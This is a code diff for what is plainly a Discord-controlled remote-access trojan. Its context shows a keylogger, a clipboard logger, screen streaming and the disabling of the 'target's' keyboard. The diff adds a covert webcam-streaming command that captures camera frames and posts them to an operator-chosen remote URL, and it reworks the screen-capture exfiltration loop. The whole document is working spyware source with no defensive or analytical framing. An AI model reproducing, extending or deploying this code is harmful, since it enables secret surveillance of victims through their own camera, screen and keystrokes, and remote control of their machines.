@@ -20,6 +20,7 @@ klogger = Keylogger()
 clogger = Cliplogger()
 activeRecording = {}
 activeStreaming = {}
+activeCam = {}
 prefix = '.'
 blocked = False
 blocker = None
@@ -490,6 +491,8 @@ async def help(ctx: commands.Context):
         ".stopsharing :: stop screenshare\n"
         ".enablekey :: enable target's keyboard input\n"
         ".disablekey :: disable target's keyboard input\n"
+        ".streamcam <url> :: stream camera from target and view it in browser\n"
+        ".stopcam   :: stop webcam streaming\n"
         "\n"
         "::FILE TRANSFER\n"
         ".download <file> [expired-time] :: turns a file into downloadable link\n"
@@ -509,34 +512,34 @@ async def help(ctx: commands.Context):
     await ctx.send(help)
 
 async def screenshare(ctx: commands.Context, url=None):
+    def grabFramebyFrame():
+        with mss() as sct:
+            monitor = sct.monitors[1]
+            screen = sct.grab(monitor)
+            frame = np.array(screen)
+            color = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
+            resize = cv2.resize(color, (1280, 720))
+            success, encodeImg = cv2.imencode('.jpg', resize, [int(cv2.IMWRITE_JPEG_QUALITY), 70])
+            if success:
+                return encodeImg.tobytes()
+            return None
     try:
         loop = asyncio.get_running_loop()
         async with aiohttp.ClientSession() as session:
-            while True:
-                def grabFramebyFrame():
-                    with mss() as sct:
-                        monitor = sct.monitors[1]    
-                        screen = sct.grab(monitor)
-                        frame = np.array(screen)
-                        color = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
-                        resize = cv2.resize(color, (1280, 720))
-                        success, encodeImg = cv2.imencode('.jpg', resize, [int(cv2.IMWRITE_JPEG_QUALITY), 70])
-                        if success:
-                            return encodeImg.tobytes()
-                    return None
-                buf = await loop.run_in_executor(None, grabFramebyFrame)
-                if buf is None:
+                while True:
+                    buf = await loop.run_in_executor(None, grabFramebyFrame)
+                    if buf is None:
+                        await asyncio.sleep(0.05)
+                        continue
+                    async with session.post(
+                        url=url,
+                        data=buf,
+                        headers={'Content-Type': 'image/jpg'},
+                        timeout=aiohttp.ClientTimeout(total=3)
+                    ) as response:
+                        if response.status != 200:
+                            pass
                     await asyncio.sleep(0.05)
-                    continue
-                async with session.post(
-                    url=url,
-                    data=buf,
-                    headers={'Content-Type': 'image/jpg'},
-                    timeout=aiohttp.ClientTimeout(total=3)
-                ) as response:
-                    if response.status != 200:
-                        pass
-                await asyncio.sleep(0.05)
     except asyncio.CancelledError:
         await ctx.send("stopped webstreaming!")
         raise
@@ -561,6 +564,60 @@ async def stopsharing(ctx: commands.Context):
         await ctx.send("no active webstreaming session here!")
         return False
 
+async def streamcam(ctx: commands.Context, url=None):
+    def grabFramebyFrame(cap):
+        ret, frame = cap.read()
+        if not ret or frame is None:
+            return None
+        success, encodedImg = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 70])
+        if success:
+            return encodedImg.tobytes()
+        return None
+
+    loop = asyncio.get_running_loop()
+    cap = cv2.VideoCapture(0)
+    try:
+        async with aiohttp.ClientSession() as session:
+            while True:
+                buf = await loop.run_in_executor(None, grabFramebyFrame, cap)
+                if buf is None:
+                    await asyncio.sleep(0.1)
+                    continue
+                try:
+                    async with session.post(
+                        url=url,
+                        data=buf,
+                        headers={'Content-Type': 'image/jpeg'},
+                        timeout=aiohttp.ClientTimeout(total=2)
+                    ) as response:
+                        if response.status != 200:
+                            pass
+                except asyncio.TimeoutError as e:
+                    await asyncio.sleep(0.5)
+                    continue
+                await asyncio.sleep(0.3)
+    except asyncio.CancelledError:
+        await ctx.send("webcam streaming stopped!")
+        raise
+    except aiohttp.ClientError as e:
+        await ctx.send(f"**aiohttp error:**\n```\n{e}\n```")
+    except Exception as e:
+        await ctx.send(f"{e}")
+    finally:
+        cap.release()
+        if ctx.channel.id in activeCam:
+            del activeCam[ctx.channel.id]
+
+async def stopcam(ctx: commands.Context):
+    if ctx.channel.id in activeCam:
+        task = activeCam[ctx.channel.id]
+        task.cancel()
+        await ctx.send("stopping webcam streaming..")
+        return True
+    else:
+        await ctx.send("no active webcam streaming session here!")
+        return False
+
 async def disable_keyboard(ctx: commands.Context):
     try:
         global blocked, blocker
@@ -570,7 +627,7 @@ async def disable_keyboard(ctx: commands.Context):
             blocked = True
             await ctx.send("disabled keyboard")
         else:
-            await ctx.send("already disabled")
+            await ctx.send("keyboard already disabled")
     except Exception as e:
         await ctx.send(f"{e}")
 
@@ -671,6 +728,18 @@ async def on_message(message):
             await ctx.send(f"starting webstreaming at url '{url}'")
             task = asyncio.create_task(screenshare(ctx=ctx, url=furl))
             activeStreaming[ctx.channel.id] = task
+        elif command == ".streamcam":
+            if len(arg) < 1:
+                await ctx.send("wrong formatting, should be `.streamcam <url>`")
+                return
+            url = arg[0]
+            if not url.startswith(("https://", "http://")):
+                await ctx.send("wrong formatting, should be `.streamcam <url>`")
+                return
+            furl = f"{url.rstrip('/')}/upload"
+            await ctx.send(f"starting webcam streaming at url '{url}'")
+            task = asyncio.create_task(streamcam(ctx=ctx, url=furl))
+            activeCam[ctx.channel.id] = task
 
         elif command == ".download":
             if not arg:
@@ -741,6 +810,8 @@ async def on_message(message):
             await hide(ctx)
         elif command == ".stopsharing":
             await stopsharing(ctx)
+        elif command == ".stopcam":
+            await stopcam(ctx)
         elif command == ".enablekey":
             await enable_keyboard(ctx)
         elif command == ".disablekey":
